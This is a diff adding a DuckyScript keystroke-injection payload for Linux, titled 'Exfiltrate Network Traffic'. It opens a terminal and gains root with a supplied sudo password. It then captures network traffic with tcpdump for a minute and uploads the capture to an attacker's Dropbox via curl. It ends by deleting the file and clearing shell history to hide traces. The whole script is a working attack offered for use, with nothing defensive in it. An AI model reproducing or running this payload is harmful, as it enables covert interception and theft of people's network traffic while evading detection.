@@ -1,0 +1,107 @@
+
+REM #############################################
+REM #                                           |
+REM # Title        : Exfiltrate Network Traffic |
+REM # Author       : Aleff                      |
+REM # Version      : 1.0                        |
+REM # Category     : Exfiltration               |
+REM # Target       : Linux                      |
+REM #                                           |
+REM #############################################
+
+REM Requirements:
+REM     - Permissions
+REM     - Internet Connection
+
+REM REQUIRED: You need to know the sudo password and replace 'example' with this
+DEFINE SUDO_PASS example
+REM REQUIRED: Set what you want to sniff, for example tcp port 80
+DEFINE SNIFFING example
+REM Set your Dropbox link or whatever you want to use to exfiltrate the sniff file
+DEFINE TOKEN example
+REM Just a Dropbox const
+DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+REM Output file path packets.pcap, remember to use pcap extension
+DEFINE FILE example.pcap
+
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### PERMISSIONS SECTION ####
+
+
+STRINGLN sudo su
+DELAY 1000
+STRINGLN SUDO_PASS
+DELAY 1000
+
+
+REM #### Network Traffic SECTION ####
+
+
+STRING FILE_PATH="
+STRING FILE
+STRING "
+ENTER
+DELAY 500
+
+STRING filter_expression="
+STRING SNIFFING
+STRING "
+ENTER
+DELAY 500
+
+REM Network card name
+STRINGLN net_card="$(ip route get 8.8.8.8 | awk '{ print $5; exit }')"
+DELAY 500
+
+REM Network dump
+STRINGLN tcpdump -i "$net_card" $filter_expression -w "$FILE_PATH" &
+DELAY 500
+
+REM Get PID
+STRINGLN tcpdump_pid=$!
+
+REM Set how long you want to sniff
+DELAY 60000
+
+REM Kill the process by PID
+STRINGLN kill $tcpdump_pid
+
+
+REM #### Exfiltrate SECTION ####
+REM You can use whatever you want, i use Dropbox
+
+STRING ACCESS_TOKEN="
+STRING TOKEN
+STRING "
+ENTER
+DELAY 500
+
+STRINGLN DROPBOX_FOLDER="/Exfiltration"
+DELAY 500
+
+STRING curl -X POST
+STRING DROPBOX_API_CONST
+STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$FILE_PATH"
+ENTER
+
+
+REM #### REMOVE TRACES ####
+
+
+STRINGLN rm "$FILE_PATH"
+DELAY 500
+
+STRINGLN history -c
+DELAY 500
+
+REM Exit from Sudo user
+STRINGLN exit
+DELAY 500
+
+REM Close the shell
+STRINGLN exit
